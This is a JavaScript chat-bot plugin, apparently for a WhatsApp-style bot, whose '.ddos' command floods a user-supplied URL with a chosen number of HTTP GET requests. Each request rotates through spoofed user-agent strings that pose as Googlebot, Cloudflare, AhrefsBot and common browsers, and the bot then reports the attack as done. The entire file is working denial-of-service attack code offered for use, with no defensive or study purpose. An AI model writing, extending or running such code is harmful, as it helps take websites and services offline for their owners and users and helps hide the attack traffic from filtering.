const axios = require('axios');

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

let handler = async(m, { conn, text, command, args }) => {
  switch (command) {
    case "ddos": {
      if (!text) return m.reply("Masukkan link target example: .ddos https://x.com [waktu] [req]");
      if (!args[0].match("http")) return m.reply(`Masukkan link yang benar!!!\nexample: .ddos https://x.com/ [waktu] [req]`);
      url = text.split(" ")[0];
      time = text.split(" ")[1];
      req = text.split(" ")[2];
      for (let i = 0; i < req; i++) {
        setTimeout(async () => {
          const UAs = [
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4183.121 Safari/537.36 (compatible; Cloudflare SpeedTest/1.0; +https://blog.cloudflare.com/new-speed-page/)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.50",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.64",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.52",
            "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
            "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)",
            "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
          ];
          await axios.get(url, {
            headers: {
              'User-Agent': UAs[Math.floor(Math.random() * UAs.length)]
            }
          });
        }, time * 1000);
      }
      await delay(time * 1000);
      m.reply(`[Info XinnClay DDOS] Done send DDoS during ${time} seconds attack on ${url} with ${req} request`);
    }
    break;
  }
};

handler.command = handler.help = ["ddos"];
module.exports = handler;